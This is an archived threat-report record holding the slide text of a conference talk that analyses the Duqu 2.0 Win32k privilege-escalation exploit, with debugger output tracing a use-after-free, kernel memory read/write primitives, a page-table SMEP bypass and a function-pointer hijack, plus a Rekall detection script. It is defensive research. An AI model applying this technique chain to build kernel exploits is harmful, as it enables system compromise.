{
    "id": "d9f0e8e5-1c85-4fdb-82a9-74e4589d799e",
    "created_at": "2022-10-25T16:48:12.363653Z",
    "updated_at": "2025-03-27T02:05:49.667732Z",
    "deleted_at": null,
    "sha1_hash": "19c98e87f5cfd25fc91b0fbbd1c684e81a276c44",
    "title": "Duqu 2.0 Win32k Exploit Analysis",
    "authors": "",
    "file_creation_date": "2015-10-05T02:43:27Z",
    "file_modification_date": "2015-10-05T02:43:27Z",
    "file_size": 1630011,
    "plain_text": "-----\n\n### Duqu 2.0\n\n###### • Duqu 2.0 was discovered by Kaspersky Lab early this year and was named as such due to its close similarity to original Duqu malware.\n\n • We will have a close look into the component used for EOP (Elevation-of-Privilege) attack.\n\n • The vulnerability used for this attack is already patched and the Microsoft Security bulletin MS15-061 was published on June 9, 2015.\n\n\n-----\n\n### Duqu 2.0\n\n##### The purpose of this talk is to reveal the exploitation method of Duqu 2.0, to educate the industry and share knowledge.\n\n The exploit exhibits a few interesting features:•It is a very complicated program.•It supports multiple OS flavors.•It actively checks for CPU features related to kernel mitigation and disables them.•It shows a high success rate with full memory read/write access.\n\n\n-----\n\n### Exploitation process\n\n\n###### Acquire full memory RW\n access\n\n\n###### Use-after free\n\n\n###### Acquire initial\n memory RW\n access\n\n\n###### Shellcode SMEP bypass execution\n\n\n-----\n\n# Use-after-free\n\n\n-----\n\n### Exploitation process\n\n\n###### Acquire full memory RW\n access\n\n\n###### Use-after free\n\n\n###### Acquire initial\n memory RW\n access\n\n\n###### Shellcode SMEP bypass execution\n\n\n-----\n\n### The nature of the vulnerability\n\n#### When the userland process registers its own ClientCopyImage callback, it destroys the Window object. It also unregisters the associated class that triggered the callback, which leads to use-after-free condition.\n\n By indirectly allocating a structure just after the use- after-free condition, the attacker can control what happens next\n\n\n-----\n\n### Filling the blank space\n\n#### The exploit calls NtUserThunkedMenuItemInfo call just after use-after-free condition.\n\n This call will allocate various objects in place of the freed memory location.\n\n The new object happens to be located in an address that will be used by HMUnlockObject call after the ClientCopyImage callback.\n\n\n-----\n\n### How use-after-free works\n\n|Col1|Col2|\n|---|---|\n|1. Use-after-free triggered from ClientCopyImage callback||\n|||\n\n|Col1|Col2|\n|---|---|\n|2. NtUserThunkedMenuItemInfo allocates and fills the freed memory||\n|||\n\n\n###### 3. HMUnlockObject will use pointer from contaminated memory.\n\n\n###### 2. NtUserThunkedMenuItemInfo allocates and fills the freed memory\n\n\n###### 1. Use-after-free triggered from\n ClientCopyImage callback\n\n\n...\n\n\n...\n\n\n...\n\n\n...\n\n\n...\n\n\n**_tagCLS_**\n\n\n**_tagCLS_**\n\n\n**_tagCLS_**\n\n\n###### Kernel Heap\n\n\n-----\n\n## Acquire initial memory RW access\n\n\n-----\n\n### Exploitation process\n\n\n###### Use-after free\n\n\n###### Acquire\n initial memory RW\n access\n\n\n###### Acquire full memory RW\n access\n\n\n###### Shellcode SMEP bypass execution\n\n\n-----\n\n### Original tagCLS object\n\n```\n1: kd> dt tagCLS fffff90140812ab0\nwin32k!tagCLS\n…\n  +0x060 cbclsExtra : 0n0  initialized to 0\n…\n  +0x090 lpszAnsiClassName : 0xfffff901`4080eb60 \"^0Vero1^\"\n…\n\n```\n\n###### The cbclsExtra field is initialized to 0 in this case, which means there is no extra memory for this class.\n\n\n-----\n\n### HMUnlockObject to corrupt a memory location\n\n```\nwin32k!HMUnlockObject+0x4:\nfffff960`0014b2f4 ff4908     dec dword ptr [rcx+8]  corruption target memory\nfffff960`0014b2f7 7532      jne win32k!HMUnlockObject+0x3b (fffff960`0014b32b)\nfffff960`0014b2f9 8b01      mov eax,dword ptr [rcx]\n\n```\n\n\n###### • Rcx points inside of one of the tagCLS objects that is pointed at by fake object.\n\n • The corruption target rcx+8 points to cbclsExtra field of the tagCLS object.\n\n • The tagCLS object is pre-allocated beforehand by calling a series of Windows\n APIs. This field is used to indicate the size of extra class memory.\n\n • Usually, APIs like GetClassLong and SetClassLong are used to access extra class\n memory.\n\n\n-----\n\n### Corrupt tagCLS object\n\n```\n2: kd> dt tagCLS fffff90140812ab0\nwin32k!tagCLS\n…\n  +0x060 cbclsExtra : 0n-1  corrupted field (0xffffffff in\nunsigned form)\n…\n  +0x090 lpszAnsiClassName : 0xfffff901`4080eb60 \"^0Vero1^\"\n\n```\n\n###### With the HMUnlockObject instruction’s corruption of the memory, it becomes -1 or 0xffffffff in unsigned DWORD form.\n\n\n-----\n\n### Out of bounds index\n\n```\nwin32k!xxxSetClassLong+0x74:\nfffff960`0035b044 3b4160     cmp eax,dword ptr [rcx+60h] (cbclsExtra)\n    eax=b44c  out of bounds index\nfffff960`0035b047 7725      ja   win32k!xxxSetClassLong+0x9e\n(fffff960`0035b06e)\n\n```\n\n\n###### • With this corrupt cbclsExtra field, the exploit will have the ability to\n freely access extra memory address space using GetClassLong and SetClassLong API sets.\n • Because the code used ja instruction to check the maximum value for\n the APIs’ index parameter, there is an unsigned comparison between 0xffffffff and the index value. It then allows the exploit to access a\n\n\n-----\n\n## Arbitrary full memory RW access\n\n\n-----\n\n### Exploitation process\n\n\n###### Acquire full memory RW\n access\n\n\n###### Use-after free\n\n\n###### Acquire initial\n memory RW\n access\n\n\n###### Shellcode SMEP bypass execution\n\n\n-----\n\n### Locating tagWND.strName\n\n```\n0: kd> dt -r win32k!tagWND fffff901`4083f000-e0\n  +0x000 head       : _THRDESKHEAD\n  …\n  +0x0d8 strName : _LARGE_UNICODE_STRING\n   +0x000 Length      : 0x10\n   +0x004 MaximumLength : 0y0000000000000000000000000010010 (0x12)\n   +0x004 bAnsi : 0y0\n   +0x008 Buffer      : 0xfffff901`40810b60 \"^0Vero1^\"  overwriting target\n\n```\n\n###### By carefully calculating the tagWND objects’ location inside the kernel based on the object returned from the call, it will locate the strName member variable inside the tagWND object by adding 0x0d8 value to the base of object\n\n\n-----\n\n### Locating tagWND.strName\n\n```\n0: kd> dt -r win32k!tagWND fffff901`4083f000-e0\n  +0x000 head       : _THRDESKHEAD\n  …\n  +0x0d8 strName : _LARGE_UNICODE_STRING\n   +0x000 Length      : 0x10\n   +0x004 MaximumLength : 0y0000000000000000000000000010010 (0x12)\n   +0x004 bAnsi : 0y0\n   +0x008 Buffer      : 0xfffff901`40810b60 \"^0Vero1^\"  overwriting target\n\n```\n\n###### The location of tagWND and its member object is calculated using the _MapDesktopObject Win32k function.\n\n\n-----\n\n### Locating tagWND.strName\n\n```\n0: kd> dt -r win32k!tagWND fffff901`4083f000-e0\n  +0x000 head       : _THRDESKHEAD\n  …\n  +0x0d8 strName : _LARGE_UNICODE_STRING\n   +0x000 Length      : 0x10\n   +0x004 MaximumLength : 0y0000000000000000000000000010010 (0x12)\n   +0x004 bAnsi : 0y0\n   +0x008 Buffer      : 0xfffff901`40810b60 \"^0Vero1^\"  overwriting target\n\n```\n\n\n###### • The exploit’s tactic is to corrupt the strName.Buffer member variable\n from tagWND and use it as a leverage for further memory access.\n • It has full memory access with 64-bit memory range and with\n arbitrary length of data\n\n\n-----\n\n### Using InternalGetWindowText API to read from kernel memory\n\n```\nNtUserSetClassLongPtr(hWND: 30208, nIndex: 12a90, dwNewLong:\nfffff6fb7dbedf90, bAnsi: 1)\n\n######  Set the tagWND.strName.Buffer value to fffff6fb7dbedf90\n* int __stdcall InternalGetWindowText(HWND hWnd: 30208, LPWSTR pString:\nccd310, int cchMaxCount: 5)\n\n  This will retrieve bytes from the designated tagWND.strName.Buffer\nlocation.\n* Return user32!InternalGetWindowText: 4\n > pString 00ccd310 \"䡣શ\"\n00ccd310 63 48 b6 0a 00 00 00 00-00 00 00 00 00 00 00 00 cH..............\n\n```\n\n-----\n\n### Using NtUserDefSetText API to write to kernel memory\n\n```\nNtUserSetClassLongPtr(hWND: 30208, nIndex: 12a90, dwNewLong: fffff68000005500, bAnsi:\n1)\n\n######  Set the tagWND.strName.Buffer value\nBOOL APIENTRY NtUserDefSetText(HWND hWnd: 30208, PLARGE_STRING WindowText: 93f608)\n\n  This writes any designated bytes to the target kernel memory location.\nWindowText:\n Length: 6\n MaxmimLength: 6\n bAnsi: 0\n Buffer: 00000000`00ccd358 63 f8 37 12 00 00 c 7\n\n```\n\n-----\n\n# SMEP bypass\n\n\n-----\n\n### Exploitation process\n\n\n###### Acquire full memory RW\n access\n\n\n###### Use-after free\n\n\n###### Acquire initial\n memory RW\n access\n\n\n###### SMEP bypass\n\n\n###### Shellcode execution\n\n\n-----\n\n### What is SMEP?\n\n##### SMEP (Supervisor Mode Execution Prevention)-CPU/OS feature to mitigate kernel exploits-Designed to block code running in usermodememory pages when executed from supervisor mode (e.g. CPL=0)-Introduced first in Windows 8[1](KeFeatureBitsand #PF handler)-Controlled via CR4.SMEP flag (20thbit)-Based on U/S (User/Supervisor) flag of page table entries\n\n###### [1] “Exploit Mitigation Improvements in Windows 8” https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf\n\n\n-----\n\n### SMEP bypass and limitations\n\n##### Known techniques developed to bypass SMEP:\n\n###### 1. Code re-use with existing kernel gadgets (kernel ROP)\n\n 2. Inject code into kernel memory without DEP (executable pages)\n\n 3. Modify nt!MmUserProbeAddress\n\n 4. Modify U/S flag\n\n##### The goal of #1 and #2 is usually clearing CR4.SMEP bit\n\n\n-----\n\n### SMEP bypass and limitations\n\n##### Previous research and proof-of-concept:\n\n|Col1|Research/POC|[1] Clear CR4.SMEP via kernel ROP|[2] Clear CR4.SMEP via custom payload|[3] Modify nt!MmUserProbeAd dress|[4] Modify U/S flag|\n|---|---|---|---|---|---|\n|Jun 2011|http://j00ru.vexillium.org/?p=783|X|X (Windows Reserve Objects)|X||\n|Sep 2012|http://blog.ptsecurity.com/2012/09/bypassi ng-intel-smep-on-windows-8-x64.html|X (KiConfigureDynamic Processor gadget)||||\n|May 2014|http://bofh.nikhef.nl/events/HitB/hitb-2014- amsterdam/praatjes/D1T2-Bypassing- Endpoint-Security-for-Fun-and-Profit.pdf|X||X|X|\n|Jul 2014|http://www.siberas.de/papers/Pwn2Own_20 14_AFD.sys_privilege_escalation.pdf|X (KiConfigureDynamic Processor gadget)||||\n|Aug 2014|https://labs.mwrinfosecurity.com/blog/2014 /08/15/windows-8-kernel-memory- protections-bypass||||X|\n\n\n-----\n\n### SMEP bypass\n##### PWN2OWN 2014\n\n###### http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdfUsed single ROP gadget that resets cr4 to 0CR4 bit 20 is to enable/disable SMEPIn nt!KiConfigureDynamicProcessor:movcr4, raxadd rsp, 28hretn\n\n\n-----\n\n### Shellcode\n\n```\n1: kd> u 3090000 <- target VA of the shellcode\n00000000`03090000 4831c0      xor rax,rax\n00000000`03090003 48ffc8      dec rax\n00000000`03090006 e800000000   call  00000000`0309000b\n00000000`0309000b 58        pop   rax\n00000000`0309000c 4883e805     sub   rax,5\n00000000`03090010 c600c3      mov byte ptr [rax],0C3h\n00000000`03090013 e9b5000000    jmp 00000000`030900cd\n00000000`03090018 4156       push  r14\n\n```\n\n###### Shellcode is first allocated in the user space using VirtualAlloc.\n\n\n-----\n\n### Original PTE for shellcode\n\n```\n1: kd> !pte 3090000\n                        VA 0000000003090000\nPXE at FFFFF6FB7DBED000  PPE at FFFFF6FB7DA00000  PDE at FFFFF6FB400000C0  PTE at\nFFFFF68000018480\ncontains 00C0000033609867 contains 0A5000003368A867 contains 19B0000033ADD867 contains\n00500000356BE867\n\n```\n```\npfn 33609   ---DA--UWEV pfn 3368a   ---DA--UWEV pfn 33add   ---DA--UWEV pfn 356be  \n---DA--UWEV user mode\n\n###### You can confirm that using !pte Windbg command.\n\n```\n\n-----\n\n### x64 Page table locations\n\n###### • PXE Pages FFFFF6FB`7DBED000\n\n • PPE Pages FFFFF6FB`7DA00000\n\n • PDE Pages FFFFF6FB`40000000\n\n • PTE Pages FFFFF680`00000000\n\n\n-----\n\n### Virtual address to physical address\n\n###### 0x3090000=Binary: 00000000 00000000 00000000 00000000 00000011 00001001 00000000 00000000\n\n Page directory\n Page map level 4 Page table index Page table entry\n pointer index Offset (12 bits)\n index (9bit) (9bit) index (9bit)\n (9bit)\n\n • PML4 Offset: 000000000\n\n • + PDP Offset: 000000000\n\n • + PD Offset: 000011000 * 8 = 0x18 * 8 = 0xC0\n\n • + Page-Table Offset: 000011000 010010000 * 8 = 0x3090 * 8 = 0x18480\n\n • Physical Page Offset: 000000000000 = 0x0\n\n Byte within page\n\n\n###### Offset (12 bits)\n\n\n###### Page directory\n pointer index\n (9bit)\n\n\n###### Page table entry\n index (9bit)\n\n\n-----\n\n### Reading PXE\n\n```\nNtUserSetClassLongPtr\nrcx=0000000000020150 rdx=00000000000145f0 r8=fffff6fb7dbed000 r9d=1\nNtUserInternalGetWindowText\nrcx=0000000000020150 rdx=000000000322d298 r8d=5\nTextCopy: read fffff6fb`7dbed000\nrcx=000000000322d298 rdx=fffff6fb7dbed000 r8=0000000000000008\nfffff6fb`7dbed000 67 98 60 33 00 00 c0 00 \ng.`3....\n\n```\n\n-----\n\n### Reading PPE\n\n```\nNtUserSetClassLongPtr\nrcx=0000000000020150 rdx=00000000000145f0 r8=fffff6fb7da00000 r9d=1\nNtUserInternalGetWindowText\nrcx=0000000000020150 rdx=000000000322d2e0 r8d=5\nTextCopy\nrcx=000000000322d2e0 rdx=fffff6fb7da00000 r8=0000000000000008\nfffff6fb`7da00000 67 a8 68 33 00 00 50 0a\ng.h3..P.\n\n```\n\n-----\n\n### Reading PDE\n\n```\nNtUserSetClassLongPtr\nrcx=0000000000020150 rdx=00000000000145f0 r8=fffff6fb400000c0 r9d=1\nNtUserInternalGetWindowText\nrcx=0000000000020150 rdx=000000000322d2e0 r8d=5\nTextCopy\nrcx=000000000322d2e0 rdx=fffff6fb400000c0 r8=0000000000000008\nfffff6fb`400000c0 67 d8 ad 33 00 00 b0 19\ng..3....\n\n```\n\n-----\n\n### Reading PTE\n\n```\nNtUserSetClassLongPtr\nrcx=0000000000020150 rdx=00000000000145f0\nr8=fffff68000018480 r9d=1\nNtUserInternalGetWindowText\nrcx=0000000000020150 rdx=000000000322d2e0 r8d=5\n\n```\n```\nTextCopy\nrcx=000000000322d2e0 rdx=fffff68000018480\nr8=0000000000000008\nfffff680`00018480 67 e8 6b 35 00 00 50 00      \ng.k5..P.\n\n```\n\n-----\n\n### Writing PTE\n\n```\nNtUserSetClassLongPtr\nrcx=0000000000020150 rdx=00000000000145f0\nr8=fffff68000018480 r9d=1\nwin32k!DefSetText+0xd7\n[d:\\9139\\windows\\core\\ntuser\\kernel\\getset.cxx @ 95]:\nfffff960`000aeadf e8dcf50200   call  \nwin32k!memcpy (fffff960`000de0c0)\nrcx=fffff68000018480 rdx=000000000322d328 r8d=8\n00000000`0322d328 63 e8 6b 35 00 00 50 00\nc.k5..P.\n\n```\n\n-----\n\n### PTE corruption & SMEP bypass\n\n```\n1: kd> !pte 3090000\n                        VA 0000000003090000\nPXE at FFFFF6FB7DBED000  PPE at FFFFF6FB7DA00000  PDE at\nFFFFF6FB400000C0  PTE at FFFFF68000018480\ncontains 00C0000033609867 contains 0A5000003368A867 contains\n19B0000033ADD867 contains 00500000356BE867\npfn 33609   ---DA--UWEV pfn 3368a   ---DA--UWEV pfn 33add   --DA--UWEV pfn 356be   ---DA--UWEV User Mode\n\n```\n\n###### After corruption, the mode for PTE is changed.\n\n```\ncontains 00C0000033609867 contains 0A5000003368A867 contains\n19B0000033ADD867 contains 00500000356BE863\npfn 33609 ---DA--UWEV pfn 3368a ---DA--UWEV pfn 33add --\n```\n\n-----\n\n# Shellcode execution\n\n\n-----\n\n### Exploitation process\n\n\n###### Acquire full memory RW\n access\n\n\n###### Use-after free\n\n\n###### Acquire initial\n memory RW\n access\n\n\n###### Shellcode SMEP bypass execution\n\n\n-----\n\n### Original PALETTE vtable\n\n```\n1: kd> dt win32k!PALETTE fffff901`407517b0-0x60\n  +0x000 hHmgr : 0xffffffff`f2080898 Void\n  ...\n  +0x060 pfnGetNearestFromPalentry : 0xfffff960`000958d4   unsigned\nlong win32k!ulIndexedGetNearestFromPalentry+0 <- original function\npointer\n\n```\n```\n  +0x068 pfnGetMatchFromPalentry : 0xfffff960`00095914   unsigned long \nwin32k!ulIndexedGetMatchFromPalentry+0\n\n###### PALETTE object is created in kernel space.\n\n```\n\n-----\n\n### Corrupt PALETTE vtable\n\n```\n1: kd> dt win32k!PALETTE fffff901`407517b0-0x60\n  +0x000 hHmgr : 0xffffffff`f2080898 Void\n  ...\n  +0x060 pfnGetNearestFromPalentry : 0x00000000`03090000   unsigned\nlong +3090000 <- corrupt function pointer\n\n```\n```\n  +0x068 pfnGetMatchFromPalentry : 0xfffff960`00095914   unsigned long \nwin32k!ulIndexedGetMatchFromPalentry+0\n\n###### The pointer to GetNearestFromPalentry is corrupted to shellcode location.\n\n```\n\n-----\n\n### Shellcode execution\n\n```\n@ CTwoPENC+2731 (inside CallGetNearestPaletteIndex)\n* GetNearestPaletteIndex(HPALETTE hpal: f2080898, COLORREF crColor: ffff)\n\n```\n\n###### Finally call GetNearestPaletteIndex method to initiate shellcode in ring-0 space.\n\n\n-----\n\n### Rekall tagCLS corruption detection\n\n###### • Find every tagWND Object.\n\n • Dump tagCLS object from tagWND+0x98.\n\n • Check if tagCLS.cbClsExtra field is huge, usually it is\n##### 0xffffffff when it is used by exploit.\n\n\n-----\n\n### Rekall tagCLS corruption detection\n\n```\nu=s.plugins.userhandles()\nfor (session, shared_info, handle) in u.handles():\n   if handle.bType=='TYPE_WINDOW':\n       handle_head=int('%x'%handle.phead,16)\n       bytes=handle.phead.obj_vm.read(handle_head+0x98, 8)\n       [tag_cls_addr]=struct.unpack(\"Q\",bytes)\n       bytes=handle.obj_vm.read(tag_cls_addr+0x60, 4)\n       [cb_cls_extra]=struct.unpack(\"L\",bytes)\n       if cb_cls_extra==0xffffffff:\n          print '* Detection: tagCLS.cbClsExtra exploitation\ndetected'\n\n```\n\n-----\n\n### Conclusion\n\n###### • Duqu 2.0 Win32k exploit is an advanced piece of\n##### malware.\n\n###### • It involves many different techniques to achieve\n##### exploitation with good success rate.\n\n###### • The techniques used are not usually observed with\n##### other Win32k exploits.\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.06.09.Duqu_2.0_Win32k_Exploit_Analysis/OhFlorio-VB2015.pdf"
    ],
    "report_names": [
        "OhFlorio-VB2015"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1444013007,
    "ts_modification_date": 1444013007,
    "files": {
        "pdf": "https://archive.orkl.eu/19c98e87f5cfd25fc91b0fbbd1c684e81a276c44.pdf",
        "text": "https://archive.orkl.eu/19c98e87f5cfd25fc91b0fbbd1c684e81a276c44.txt",
        "img": "https://archive.orkl.eu/19c98e87f5cfd25fc91b0fbbd1c684e81a276c44.jpg"
    }
}